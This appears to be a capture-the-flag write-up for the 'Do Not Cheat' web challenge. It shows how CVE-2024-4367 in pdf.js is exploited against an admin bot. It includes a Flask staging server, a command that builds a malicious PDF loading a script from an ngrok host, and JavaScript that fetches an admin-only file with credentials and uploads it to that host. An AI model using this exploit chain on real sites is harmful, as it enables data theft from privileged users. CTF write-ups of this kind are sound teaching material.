## Do Not Cheat


> I've prepared a set of useful cheatsheets. This might be helpful for any hacker.
> 🔗 https://do-not-cheat-bb7d7982d597.1753ctf.com


In this chall given a website with some cheatsheets, looking the source code from browser it is evident there exist a `flag.pdf` file containing real flag but it's access is not given to normal user, only admin can view the `flag.pdf` file. 

Also the `/report` route exist where we can pass any pdf as query parameter to get it viewed by the admin...

Like this - `https://do-not-cheat-bb7d7982d597.1753ctf.com/report?document=public/BLUE.pdf`

Hmm, so admin is a bot! (common in CTF challs)

Now if we look console while testing the web app, we can see logs that tells us the pdf-viewer used by the web app is `pdf-dist version 4.1.392` which is severely vulnerable to arbitary code execution (CVE-2024-4367). 

So if we can pass a vulnerable pdf to `/report` route we could solve this challenge. 

Let's get into it -

From the [POC of CVE-2024-4367](https://github.com/LOURC0D3/CVE-2024-4367-PoC) we can embed our malicious script to the a pdf.

First we'll create a flask http server for our utility with this code -

```python

from flask import Flask, send_file, request, jsonify
from flask_cors import CORS, cross_origin
import os

app = Flask(__name__)
cors = CORS(app)

UPLOAD_FOLDER = 'uploads'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

@app.route('/')
@cross_origin()
def poc_pdf():
    return send_file("poc.pdf")

@app.route('/payload')
@cross_origin()
def payload():
    return send_file("payload.js")

@app.route('/upload', methods=['POST'])
@cross_origin()
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400
    
    file = request.files['file']
    
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400
    
    if file:
        filename = os.path.join(UPLOAD_FOLDER, file.filename)
        file.save(filename)
        return jsonify({
            'ok': True,
            'message': 'File uploaded successfully',
            'filename': file.filename
        }), 200

if __name__ == '__main__':
    app.run(debug=True)
```

Here we have three endpoints
- `/` - gives the malicious pdf, we'll create it later
- `/payload` - gives payload.js file which is a malicious script
- `/upload` - basic file upload utility

Firstly, start the web server.

To host this flask server we'll use `ngrok`, which uses port tunelling to make the local server accessible from anywhere on internet.

My server is running on the domain `45a8-122-162-147-205.ngrok-free.app`, yours will be different so run commands accordingly.

Let's create the malicious pdf by following command -

```bash
$ python3 CVE-2024-4367.py "var s=document.createElement('script');s.src='https://45a8-122-162-147-205.ngrok-free.app/payload';document.body.append(s)"
[+] Created malicious PDF file: poc.pdf
[+] Open the file with the vulnerable application to trigger the exploit.
```

This will create our malicious `poc.pdf`

To generate the malicious pdf we'll be taking help from the [POC of CVE-2024-4367](https://github.com/LOURC0D3/CVE-2024-4367-PoC) as mentioned above

The code injected in pdf quiet simple, it will load the javascript file `payload.js` availabe at `/payload` endpoint of our utility web server and will execute it

Now for `payload.js` we have -

```javascript
(async () => {
    const res = await fetch("/app/admin/flag.pdf", { credentials: 'include' });
    const blob = await res.blob();

    const formData = new FormData();

    formData.append('file', new File([blob], 'flag.pdf', { type: 'application/pdf' }));

    await fetch('https://45a8-122-162-147-205.ngrok-free.app/upload', {
        method: 'POST',
        body: formData
    });
})();
```

Simple function which just fetch the flag.pdf data and upload the pdf to `/upload` endpoint of our utility web server

Now if i'll send our utility web server url to admin using `/report` endpoint on website we'll get our flag uploaded inside the `/uploads` folder, ~ crazyyy ~

just go to `https://do-not-cheat-bb7d7982d597.1753ctf.com/report?document=https://45a8-122-162-147-205.ngrok-free.app` and you will get the flag paved on your machine


